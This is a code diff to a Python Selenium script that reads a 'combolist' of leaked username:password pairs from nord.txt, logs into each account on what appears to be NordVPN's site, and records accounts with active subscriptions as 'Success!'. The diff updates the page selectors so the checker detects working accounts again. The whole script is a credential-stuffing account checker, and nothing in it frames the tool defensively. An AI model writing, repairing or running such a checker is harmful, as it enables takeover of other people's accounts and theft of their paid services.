@@ -19,7 +19,6 @@ try:
             user.append(i.split(":")[0])
             password.append(i.split(":")[1].split(" ")[0].strip())
 except FileNotFoundError as e:
-    print(e)
     print("No combolist found in: " + user_directory + "\nPlease add 'nord.txt' and try again.\nPress Enter to end.")
     input()
     exit()
@@ -64,13 +63,11 @@ while index != len(user):
             	no_sub = browser.find_element(By.XPATH, '//*[@id="app"]/div[2]/div[2]/div/div[1]/div[3]/div/div/div[1]/p').text
             	if 'No active subscriptions' in no_sub:
             		print(" | {}:{} ---> No Active Subscription".format(user[index], password[index]))
-            else:
-            	text = browser.find_element(By.XPATH,'//*[@id="app"]/div[2]/div[2]/div/div[1]/div[3]/div/div[1]/div/div/div/div[1]/div[2]/div').text
-            	if 'Active' in text:
-                	print(" | {}:{} ---> Success!".format(user[index], password[index]))
-                	accounts.write(user[index] + ":" + password[index] + "\n")
-            	else:
-                	print(" | {}:{} ---> Expired!".format(user[index], password[index]))
+            if browser.find_elements(By.XPATH,'//*[@id="app"]/div[2]/div[2]/div/div[1]/div[3]/div/div[1]/div[1]/div/div/div[1]/div[2]/div'):
+                print(" | {}:{} ---> Success!".format(user[index], password[index]))
+                accounts.write(user[index] + ":" + password[index] + "\n")
+            #else:
+               # print(" | {}:{} ---> Expired!".format(user[index], password[index]))
         else:
             print(" | {}:{} ---> Account not working".format(user[index], password[index]))
         browser.quit()
